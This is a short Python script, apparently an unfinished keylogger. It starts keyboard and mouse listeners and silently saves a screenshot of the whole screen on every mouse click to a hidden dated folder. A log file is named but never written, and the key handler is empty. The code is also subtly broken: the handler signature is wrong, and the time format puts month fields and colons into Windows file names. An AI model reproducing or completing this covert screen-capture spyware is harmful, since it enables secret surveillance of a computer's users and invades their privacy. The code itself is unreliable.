from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener
from datetime import datetime
import re, os, pyautogui as pyt

datanow = datetime.now()
data = datanow.strftime('%d-%m')
save = r'C:\Users\arthu\Desktop\Save\Content_' + data + '/'
arqlog = save + 'keylogger.log'

try:
    os.mkdir(save)
except:
    pass

def on_press():
    pass

def on_click(x, y, button, pressed):
    if pressed:
        Print = pyt.screenshot()
        hora = datetime.now()
        horaprint = hora.strftime('%h:%m:%s')
        Print.save(os.path.join(save, 'printklp_'+ horaprint +'.jpg'))


keyboardListener = KeyboardListener(on_press=on_press)
mouseListener = MouseListener(on_click=on_click)

keyboardListener.start()
mouseListener.start()
keyboardListener.join()
mouseListener.join()
